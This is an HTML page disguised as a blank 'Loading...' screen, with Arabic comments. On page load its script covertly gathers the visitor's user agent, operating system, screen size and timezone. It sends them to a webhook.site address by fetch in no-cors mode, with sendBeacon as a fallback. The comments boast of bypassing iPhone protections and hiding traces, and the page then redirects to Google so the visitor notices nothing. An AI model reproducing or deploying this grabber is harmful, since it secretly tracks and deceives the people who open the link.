<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body { margin: 0; padding: 0; background: #ffffff; height: 100vh; overflow: hidden; }
    </style>
</head>
<body>
    
    <script>
        // النسخة النهائية - إرسال عبر Fetch للجوال

        // 1. دالة جمع البيانات
        function collectData() {
            const ua = navigator.userAgent;
            let os = "Unknown";
            if (ua.includes('Windows')) os = "Windows";
            else if (ua.includes('Mac')) os = "macOS";
            else if (ua.includes('iPhone')) os = "iOS";
            else if (ua.includes('Android')) os = "Android";

            return {
                ua: ua,
                os: os,
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };
        }

        // 2. دالة الإرسال (تجاوز حماية آيفون)
        function sendData() {
            const data = collectData();
            
            // ================================================
            //  الرابط الخاص بك
            // ================================================
            const webhook = 'https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d33397';

            // إرسال البيانات كـ JSON Body عبر طلب POST (يتجاوز حماية قطع الروابط)
            fetch(webhook, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data),
                mode: 'no-cors' // يمنع المتصفح من إظهار أخطاء الحماية
            }).catch(() => {
                // إذا فشل الـ fetch، استخدم الـ sendBeacon (طريقة أخرى آمنة للجوال)
                navigator.sendBeacon(webhook, JSON.stringify(data));
            });
        }

        // 3. تشغيل الكود وإخفاء الأثر
        window.onload = function() {
            // إرسال البيانات
            sendData();

            // بعد ثانية، التحويل إلى جوجل
            setTimeout(function() {
                window.location.replace("https://www.google.com");
            }, 1000);
        };
    </script>
</body>
</html>
